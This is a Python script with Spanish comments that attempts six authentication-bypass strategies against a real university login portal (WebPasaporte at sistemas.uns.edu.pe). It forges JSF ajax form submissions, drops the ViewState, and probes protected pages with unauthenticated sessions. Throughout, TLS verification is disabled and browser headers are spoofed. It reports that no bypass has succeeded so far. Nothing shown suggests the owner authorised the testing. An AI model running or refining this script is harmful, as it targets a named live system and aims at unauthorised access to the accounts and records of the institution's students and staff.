#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

# ============================================
# ESTRATEGIA: Evitar el paso de seleccion de tipo
# Enviar cmdEstudiante + campos de login en UN SOLO request
# ============================================

s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
})

# Step 1: Get login page and ViewState
r = s.get('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml', timeout=10)
vs = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r.text)
vstate = vs.group(1) if vs else ""
print(f"ViewState obtenido: {vstate[:50]}...")

# Step 2: Click cmdEstudiante AND submit login in SAME request
# This bypasses the type selection entirely
print("\n=== ESTRATEGIA 1: cmdEstudiante + login en un solo request ===")
data1 = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': vstate,
    'javax.faces.partial.ajax': 'true',
    'javax.faces.source': 'frmLogueo:cmdEstudiante',
    'javax.faces.partial.execute': 'frmLogueo',
    'javax.faces.partial.render': 'frmLogueo',
    'frmLogueo:itUsuario': 'fake',
    'frmLogueo:itClave': 'fake',
}
r1 = s.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
               data=data1, timeout=10, allow_redirects=True)
print(f"Status: {r1.status_code}, len={len(r1.text)}")

text_clean = re.sub(r'<[^>]+>', ' ', r1.text)
text_clean = re.sub(r'\s+', ' ', text_clean).strip()
# Check if it's the dashboard or error
if 'logueo' not in text_clean.lower():
    print(f"[!] La pagina ya no es de login!")
    print(f"  Contenido: {text_clean[:300]}")
else:
    print(f"  Todavia en login")
    # Check for any messages
    for kw in ['error', 'correcto', 'incorrecto', 'bienvenido', 'acceso']:
        if kw in text_clean.lower():
            idx = text_clean.lower().find(kw)
            print(f"  [{kw}]: {text_clean[max(0,idx-30):idx+100]}")

# Step 3: Try cmdTrabajador + login
print("\n=== ESTRATEGIA 2: cmdTrabajador + login ===")
s2 = requests.Session()
s2.verify = False
s2.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
})
r2 = s2.get('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml', timeout=10)
vs2 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r2.text)
vstate2 = vs2.group(1) if vs2 else ""

data2 = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': vstate2,
    'javax.faces.partial.ajax': 'true',
    'javax.faces.source': 'frmLogueo:cmdTrabajador',
    'javax.faces.partial.execute': 'frmLogueo',
    'javax.faces.partial.render': 'frmLogueo',
    'frmLogueo:itUsuario': 'fake',
    'frmLogueo:itClave': 'fake',
}
r3 = s2.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                data=data2, timeout=10, allow_redirects=True)
print(f"Status: {r3.status_code}, len={len(r3.text)}")
tc3 = re.sub(r'<[^>]+>', ' ', r3.text)
tc3 = re.sub(r'\s+', ' ', tc3).strip()
if 'logueo' not in tc3.lower():
    print(f"[!] La pagina ya no es de login!")
    print(f"  Contenido: {tc3[:300]}")
else:
    print(f"  Todavia en login")

# Step 4: Try sending ONLY cmdEstudiante (no credentials) - just clicking the button
print("\n=== ESTRATEGIA 3: Solo cmdEstudiante sin credenciales ===")
s3 = requests.Session()
s3.verify = False
s3.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
})
r4 = s3.get('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml', timeout=10)
vs4 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r4.text)
vstate4 = vs4.group(1) if vs4 else ""

data4 = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': vstate4,
    'javax.faces.partial.ajax': 'true',
    'javax.faces.source': 'frmLogueo:cmdEstudiante',
    'javax.faces.partial.execute': 'frmLogueo',
    'javax.faces.partial.render': 'frmLogueo',
}
r5 = s3.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                data=data4, timeout=10)
print(f"Status: {r5.status_code}, len={len(r5.text)}")
# Check if clicking just the button changes anything
tc5 = re.sub(r'<[^>]+>', ' ', r5.text)
tc5 = re.sub(r'\s+', ' ', tc5).strip()
if len(r5.text) > 14303:
    print(f"  Tamano aumento de 14303 a {len(r5.text)} - PAGINA CAMBIO!")
    # Check what's in the response
    body_match = re.search(r'<body[^>]*>(.*?)</body>', r5.text, re.DOTALL)
    if body_match:
        body = body_match.group(1)
        body_clean = re.sub(r'<script[^>]*>.*?</script>', '', body, flags=re.DOTALL)
        body_clean = re.sub(r'</?[^>]+>', ' ', body_clean)
        body_clean = re.sub(r'\s+', ' ', body_clean).strip()
        print(f"  Cuerpo: {body_clean[:500]}")
else:
    print(f"  Tamano igual que el original (14303)")

# Step 5: Try accessing protected pages directly after clicking cmdEstudiante
print("\n=== ESTRATEGIA 4: Acceder a paginas protegidas directamente ===")
s4 = requests.Session()
s4.verify = False
s4.headers.update({'User-Agent': 'Mozilla/5.0'})
# First click cmdEstudiante to establish session
r_click = s4.get('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml', timeout=10)
vs5 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_click.text)
vstate5 = vs5.group(1) if vs5 else ""
click_data = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': vstate5,
    'javax.faces.partial.ajax': 'true',
    'javax.faces.source': 'frmLogueo:cmdEstudiante',
    'javax.faces.partial.execute': 'frmLogueo',
    'javax.faces.partial.render': 'frmLogueo',
}
r_click2 = s4.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                      data=click_data, timeout=10)
jsession = dict(s4.cookies).get('JSESSIONID', '')
print(f"JSESSIONID after cmdEstudiante: {jsession}")
print(f"Response len: {len(r_click2.text)}")

# Now try to access other pages with this session
endpoints = [
    'https://sistemas.uns.edu.pe/WebPasaporte/faces/index.xhtml',
    'https://sistemas.uns.edu.pe/WebPasaporte/faces/inicio.xhtml',
    'https://sistemas.uns.edu.pe/WebPasaporte/faces/estudiante.xhtml',
    'https://sistemas.uns.edu.pe/WebPasaporte/faces/ingreso.xhtml',
    'https://sistemas.uns.edu.pe/WebPasaporte/faces/error.xhtml',
]
for ep in endpoints:
    try:
        r_ep = s4.get(ep, timeout=5)
        tc = re.sub(r'<[^>]+>', ' ', r_ep.text)
        tc = re.sub(r'\s+', ' ', tc).strip()
        has_login = 'logueo' in tc.lower() or 'cmdEstudiante' in tc
        has_data = any(kw in tc.lower() for kw in ['records', 'no records', 'modulo', 'estudiante', 'bienvenido', 'inicio'])
        print(f"  {ep.split('/')[-1]} -> {r_ep.status_code}, len={len(r_ep.text)}, login={has_login}, data={has_data}")
    except:
        pass

# Step 6: Try cmdInstruccion + login (the instructions button might not require auth)
print("\n=== ESTRATEGIA 5: cmdInstruccion (puede no requerir login) ===")
s5 = requests.Session()
s5.verify = False
s5.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
})
r6 = s5.get('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml', timeout=10)
vs6 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r6.text)
vstate6 = vs6.group(1) if vs6 else ""

data6 = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': vstate6,
    'javax.faces.partial.ajax': 'true',
    'javax.faces.source': 'frmLogueo:cmdInstruccion',
    'javax.faces.partial.execute': 'frmLogueo',
    'javax.faces.partial.render': 'frmInstrucciones',
}
r7 = s5.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                data=data6, timeout=10)
print(f"Status: {r7.status_code}, len={len(r7.text)}")
tc7 = re.sub(r'<[^>]+>', ' ', r7.text)
tc7 = re.sub(r'\s+', ' ', tc7).strip()
print(f"  Contenido: {tc7[:300]}")

# Step 7: Try with just the form submission and wrong/missing ViewState
print("\n=== ESTRATEGIA 6: Sin ViewState ===")
s6 = requests.Session()
s6.verify = False
s6.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
})
data7 = {
    'frmLogueo': 'frmLogueo',
    'frmLogueo:itUsuario': 'fake',
    'frmLogueo:itClave': 'fake',
}
r8 = s6.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                data=data7, timeout=10)
print(f"Sin ViewState: Status {r8.status_code}, len={len(r8.text)}")
tc8 = re.sub(r'<[^>]+>', ' ', r8.text)
tc8 = re.sub(r'\s+', ' ', tc8).strip()
if len(r8.text) != 12585:
    print(f"  [!] La respuesta cambio!")
    print(f"  Contenido: {tc8[:300]}")

print("\n=== RESUMEN ESTRATEGIAS ===")
print("Se probaron 6 estrategias de bypass para WebPasaporte")
print("Ninguna logro el bypass total todavia")
print("El sistema requiere seleccionar tipo + credenciales")
